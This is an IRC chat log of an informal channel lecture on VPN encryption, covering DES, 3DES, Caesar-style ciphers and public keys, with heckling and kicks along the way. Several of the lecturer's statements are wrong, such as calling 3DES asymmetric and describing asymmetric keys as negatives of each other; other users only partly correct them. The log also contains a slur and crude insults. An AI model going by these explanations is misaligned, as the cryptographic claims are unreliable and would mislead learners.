+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; you're banning ascii porn??</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; during IKE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; wWTF?!@#$</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; during IKE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- syme 
+(syme@67PiI0RHbbdpp.dyn154.pacific.net.au) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the authentication method is 
+decided</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; first</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; when its -lecture its cool but 
+when we are doing a lecture yup</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; :(((</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- phatal has quit (Read error: 104 
+(Connection reset by peer))</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; let _Jonah_ talk</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; i feel so dry all of the sudden</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; done//</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; yes</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; go!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; okie</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; in Preshared keys</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; each party has their own 
+encryption key</P>
+<P style="MARGIN-BOTTOM: 0cm">Ralph r1c0 rpc &lt;_Jonah_&gt; already</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;Ralph&lt; be quiet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and the endnode do a calculation 
+/hash value on the key</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; rek (rek4@r7VaTMC96iA.208.25.255.O) has 
+joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">--- ChanServ gives channel operator status to 
+rek</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and send it to their respective 
+comunique</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; to verify they have the same 
+key</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; in a public key situation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; sup rek</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rek&gt; hey</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; one of hte keys are shared in a 
+public fashion</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; typically on a CA, i.e. Verisign / 
+Etrust</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; phatal 
+(phatal@cppVKcnbbmJsQ.bhm.bellsouth.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ust remember the difference</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; b/w public and private</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; ldh1 (burrito@cxN67oGoRK2.64.146.135.O) has 
+joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i will describe them in detail in 
+a bit</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; now for a metaphor</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; that de4scribes the basics of 
+encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i'm sure you are all familiar w/ 
+Juilius Ceasar</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well in those days you could only 
+trust very few people</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; actually that holds some 
+similarities with today</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; never the less</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; syme_ 
+(syme@67PiI0RHbbdpp.dyn154.pacific.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; he of course trusted some 
+people</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but when he wanted to communicate 
+w/ them he sent them a message via a messenger</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; his correspondent</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and he</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; both had a set agreement</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; on an encryption patter</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i.e. every E would equal D and 
+every C=B</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; only they knew the pattern</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; that relates to the private key 
+scenario of already designated encryption rules</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Xinu (Snak@bUim1zhHbb6I.dyn.optonline.net) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; -----</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; plus</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; sorry</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; jackass messaging me</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the above scenario is simply 
+called</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; damn mad ppl are awake for this 
+lecture, lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; symetric encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; PhrostByte 
+(PhrostByte@RlNKlHrtD4k.socal.rr.com) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there is also</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; aysmetric encryption( w/o 
+symetry)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; which i will describe later</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; another term is cipher text , this 
+is the data being encrypted</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Encrytipon is the act of 
+transforming clear text into cipher text</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; normally a key has to be provided 
+along w/ the cipher textt</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; this is a simple formula those 
+describles the encrytion processs</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- PhrostByte 
+(PhrostByte@RlNKlHrtD4k.socal.rr.com) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; PhrostByte 
+(PhrostByte@RlNKlHrtD4k.socal.rr.com) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ciphertext= f (clear-text, K1)</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;Mikkkeee&lt; whats up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; whereis f=algorithm,K=Key </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; suppose you had the word</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; fag</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; whoops</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i should be PC</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the word toy</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; toy =clear-text</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; algorithm will be add 3 letters to 
+each letter</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; whoops</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; algorithm is addletters</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; while</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the Key is add 3 letters</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- linuxlogic has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; cipher= add-letters( toy , 3)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; result would be</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; wrb= addletters( toy, 3)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; decryption would do the 
+oppositte</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; removeletters( wrb ,3) = toy</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; simple eh</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; definition </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Phaedrus has quit (Read error: 104 
+(Connection reset by peer))</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; for decryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Phaedrus (bar@PSBfMieMHWU.128.164.62.O) has 
+joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Zomart has quit ()</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the process of taking the cipher 
+text and translating it into clear text..... ( btw this requires a key also)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; what i describe above</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is a bloated ex. of symentic 
+encrption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- syme_ has quit (Argh! Learn how to fucking 
+spell or piss off and die.)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; since there are 56 bit</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; bits</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there are 2^56 possible keys</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; or</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; about 72x10^12 keys</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; MIT says</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; an average dude with 400 bucks 
+would take 38 years to crack regular des encrption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; however US Governemnt with 
+300million takes 12 seconds</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; an alternate DES was 
+developped</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; where</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the data is Encrypted with Key1 
+then decrypted with Key2 and reecrpted with Key1</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thus make the totaol key size to 
+56x2</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; theres even another type of 
+DES</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Mikkkeee sets mode +R #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; called 3des where 3 different Keys 
+are involved</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Chris&gt; --- Chris sets mode +R Chris</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; K1 encrypts, k2 decrpts,k3 
+encryps</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Chris&gt; ;)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and the process is reversed on the 
+decryption end</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thers another type of encrption 
+called Asymetric .. but i'll first take questions again</P>
+<P style="MARGIN-BOTTOM: 0cm">--- simprix sets mode -m #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; any questions</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ha</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i dont think anybody is 
+listening</P>
+<P style="MARGIN-BOTTOM: 0cm">* Lunarcade stirs</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; damn place is packed</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; we are listening</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; SpiderMan (SpiderMan@NIZ2cxYsTpo.o1.com) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">--- ChanServ gives channel operator status to 
+SpiderMan</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; im listening</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; *we are</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;snidx2&gt; listening</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; sup spider</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;SpiderMan&gt; hey</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; watching</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; you are just explaining ut very 
+well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; i can say WE cos we have a royal 
+family :O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; ;)</P>
+<P style="MARGIN-BOTTOM: 0cm">* Phaedrus is more reading than anything</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; simprix: ur correct</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; lemme just finish up then</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; wityh asymetric encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">--- simprix sets mode +m #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- ldh1 has quit (Your explaining it horribly. 
+I'm scarred for ever.)</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; [RaFa] (~none@bbmaCUCLI54Y.wantstofuck.us) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; my fingers are terrible tired from 
+typing</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; sup rafa</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Asymmetric involves a public and a 
+private key</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; its typically used for 
+authentication</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; ;)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; b/c of the high packet payload 
+(due to a lot of keys) it doesnt provide an efficient method of data transport 
+for time</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; critical data</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; this type is 3des</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; where 3 diff. keys are used</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it relies on complex mathamatical 
+algorithms that mainly depend on large prime numbers....</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; trinity (mec@sV6ppNXc5Bss.203.197.150.O) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the encryption processs is simliar 
+in equation for tot that of symetric encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; where</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- phatal has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Encryption = ciphertext= 
+shift-right ( clear-text , 3)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but the</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; decryption uses a different 
+relation similar to</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; decryptions = cleartext= 
+shift-right (cipher-text, -3)</P>
+<P style="MARGIN-BOTTOM: 0cm">* Chris is away: brb</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the relations ship between key 1 
+and key 2 is K1= (-1)K2</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; as with symmetric K1=k2</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; now when deploying VPN</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; keep in mind</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; what sorta encryption algorithm 
+you are going to impart in ur VPN</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; if you are on a slow WAN link</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; you probably want to limit ur 
+asymetric encryption to just authentication</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; then transfer private keys for 
+symetric encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; however</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Mikkkeee gives channel operator status to 
+[RaFa]</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; one sec</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; phatal 
+(phatal@Ta5W3Z8Rgg6.bhm.bellsouth.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; my bad silly cat</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; bluhayz 
+(bluhayz@fbbjxw4qW6zo.nv.nv.cox.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok symetric is more efficient 
+primarly b/c its smaller pay load</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; key size is small</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Mikkkeee gives channel operator status to 
+bluhayz</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thus its more efficient for bulk 
+transfers </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and for slow wan links</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Aysmetric is exacly the 
+opposite</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; oh yea</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; CBC</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; outer-cipher block chaining is 
+used in VPN packets</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; to input spoiler data in the 
+packet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so that repetative data does 
+become pattern encrypted</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; like someone is using a 
+website</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- snidx2 has quit ()</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the pass is resent over and over 
+each time they view anothe rpage in that secure domain</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well thats it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; :-D</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i know i prolly went into 
+encryption to much</P>
+<P style="MARGIN-BOTTOM: 0cm">--- simprix sets mode -m #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; it's over?</P>
+<P style="MARGIN-BOTTOM: 0cm">* b0ttyburp clap "" clap """ clap """ :O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but its important for 
+understanding the transfer of VPN data</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; hehe</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; if you wanna put it all 
+together</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; you can</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i'm so tired from typing</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; _Jonah_: Alright......how are 
+symmetric keys transferred? Aren't most symmetric algotirhms alot more complex 
+than assymetric? </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; damnit.. I missed the whole 
+thing!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Phaedrus: the opposite would be 
+correct</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; so did i, i only got to see half 
+of it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; bluehayz it will be online</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; well....implementationally</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; aight</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- _bAss has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; bluhayz &amp; mikkkeee me got 
+it all log</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; i have the log </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; ;)))))))))))</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; cool cool</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; that will be online</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; email it to mikkkeee</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; i will when i clean it up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Xinu&gt; b0ttyburp</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i have an outline i made up </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; Phaedrus is correct</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; you want it simprix?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; nodnod</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; Xinu: hi d00d</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Xinu&gt; lol hey</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; _bAss 
+(ffffffffff@qljb82PjWFA.b.003.syd.iprimus.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; I want everything</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; e(m) = m^e mod p is a hell of 
+alot easier than the complicated jungle of permutations and substitutions of 
+DES</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Xinu&gt; dont you feel cooler now that you 
+know the meaning of life</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_bAss&gt; is this crap over yet</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;_Jonah_&lt; dont worry about it, when will 
+youu do implementation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; werd.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well asymmetric is more complex 
+mathematically </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; damn come on</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; this really sucked</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; shit!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- simprix has kicked _bAss from #bsrf 
+(simprix)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; not really</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; its actually quite elegant</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; however symetric complexity is 
+dependant on how many des passes is made</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; um YEA right</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; this lecture suck nutz!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- simprix has kicked phatal from #bsrf 
+(simprix)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- simprix has kicked c0ld from #bsrf 
+(simprix)</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; phatal 
+(phatal@Ta5W3Z8Rgg6.bhm.bellsouth.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; wtf is with all these losers?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; oh thats nice simprix</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Xinu&gt; whoa</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; Phaedrus basically typed the 
+fundamentals of most public key algorithms</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; modular exponentation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Xinu&gt; uhmmm atnNn does</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; dude this damn channel was 
+moderated for like an hour and a half</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; thats just lame</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Xinu&gt; is this a lecture right now?</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Ka0ticSH 
+(Ka0ticSH@6MVGs96CXVI.lsanca2.dsl-verizon.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; hey cold and phatal if you think 
+it sucked then why dont youu do one</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; (which is why asymmetric crypto is 
+slower than symmetric, btw, due to the massive number crunching invovled with 
+modular exponentation)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; or superincreasing knapsacks, or 
+the solving of discreet logs over a finite domain</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; c0ld 
+(c0ld@10LEG6SNXrg.chcgil2.dsl-verizon.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; it doesn't have anything to do with 
+the payload size</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; hmm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; phatal it was moterated because of 
+a lecture</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- st0ic has quit (i throw rocks at retard 
+kids...[ www.fsix.net ])</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; no shit man but I like to talk 
+here, not listen so a bunch of shit</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; I mean do them in #bsrflecture or 
+something</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; yes.....the permutations and 
+substitutions of DES (for example) are basically simple logical and mathematical 
+operations....just alot of them</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; lol.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; phatal: wipe ur mouth shit is 
+dribbling out :O)</P>
